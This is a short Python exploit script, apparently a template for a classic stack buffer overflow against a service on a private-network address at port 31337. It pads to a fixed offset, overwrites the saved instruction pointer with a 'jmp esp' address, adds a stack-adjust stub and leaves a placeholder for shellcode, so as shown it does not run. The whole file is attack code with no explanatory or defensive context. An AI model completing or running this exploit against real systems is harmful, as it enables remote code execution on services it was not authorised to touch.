#!/usr/bin/env python3
import socket
import struct

RHOST = "192.168.1.81"
RPORT = 31337


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))


buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

sub_esp_10 = b"\x83\xec\x10"

# PUT SHELLCODE HERE


buf =  b""
buf += b"A"*(offset_srp - len(buf))		# padding
buf += struct.pack("<I", ptr_jmp_esp)		# EIP overwrite
buf += sub_esp_10				# ESP points here (we move it to avoid any overwrite - nopsled alternative)
buf += shellcode				# ShellCode
buf += b"D"*(buf_totlen - len(buf))		# Trailing Padding
buf += b"\n"

s.send(buf)
